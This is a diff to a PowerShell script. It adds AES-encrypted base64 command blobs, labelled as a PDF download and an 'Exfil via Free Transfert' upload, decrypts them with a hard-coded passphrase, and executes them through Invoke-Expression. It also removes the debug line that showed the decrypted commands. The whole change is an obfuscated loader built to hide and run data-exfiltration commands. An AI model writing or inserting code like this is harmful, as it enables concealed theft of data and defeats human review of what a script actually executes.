@@ -10,33 +10,32 @@ function Decrypt-String {
     $keyBytes = [System.Text.Encoding]::UTF8.GetBytes($padded)
     $iv       = New-Object byte[] 16
 
+    # decrypt
     $cipherBytes = [Convert]::FromBase64String($CipherTextBase64)
     $aes         = [System.Security.Cryptography.Aes]::Create()
-    $aes.Mode    = 'CBC'; $aes.Padding = 'PKCS7'
-    $aes.Key     = $keyBytes;      $aes.IV      = $iv
+    $aes.Mode    = 'CBC'
+    $aes.Padding = 'PKCS7'
+    $aes.Key     = $keyBytes
+    $aes.IV      = $iv
 
     $decryptor = $aes.CreateDecryptor()
     $ms        = New-Object System.IO.MemoryStream(,$cipherBytes)
-    $cs        = New-Object System.Security.Cryptography.CryptoStream(
-                     $ms, $decryptor,
-                     [System.Security.Cryptography.CryptoStreamMode]::Read
-                  )
-    $sr    = New-Object System.IO.StreamReader($cs)
-    $plain = $sr.ReadToEnd()
+    $cs        = New-Object System.Security.Cryptography.CryptoStream($ms,$decryptor,[System.Security.Cryptography.CryptoStreamMode]::Read)
+    $sr        = New-Object System.IO.StreamReader($cs)
+    $plain     = $sr.ReadToEnd()
     $sr.Close(); $cs.Close(); $ms.Close()
     return $plain
 }
 
 $EncryptedCommands = @(
-    # ── 1) Download the HIBP PDF to Desktop
-    '<PASTE_YOUR_FIRST_BASE64_BLOB_HERE>',
-    # ── 2) Upload it via Free Transfert and print the link
-    '<PASTE_YOUR_SECOND_BASE64_BLOB_HERE>'
+    # ── 1) Download the HIBP PDF
+    '1Afgn9y2LnD1emDCHXVtgp5NoG/P8A1Q3YeXkUhfofXaUWAHOBJrHBlZdbOrwi8r0f3hBr4Ti8oXZ+sPbS6OQ3TAX69OG/P8KLnlxxiCRe80p3rcC0MEfcfptEc8a5ArI6EbYG7gpzt4Fy5qv0vrJ0r88L23o5j6wZ0lrCkcdSrh2xdN/OVF3pto96vlBsl7v7BaUEYGDN2cR3fVdl99HMu81EzXc2QumH72fyUCtlN/uYMm0lsPYUs3Vor+Fk1fg2GpRK4d+CHiv/eIT1m1Sg==',
+
+    # ── 2) Exfil via Free Transfert
+    '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'
 )
 
 $passphrase = 'Junade Ali'
 foreach ($b in $EncryptedCommands) {
-    # for debugging you can uncomment next line to see the cleartext:
-    # Write-Host "DECRYPTED → $([Decrypt-String]::Invoke($b,$passphrase))"
     Invoke-Expression (Decrypt-String $b $passphrase)
 }
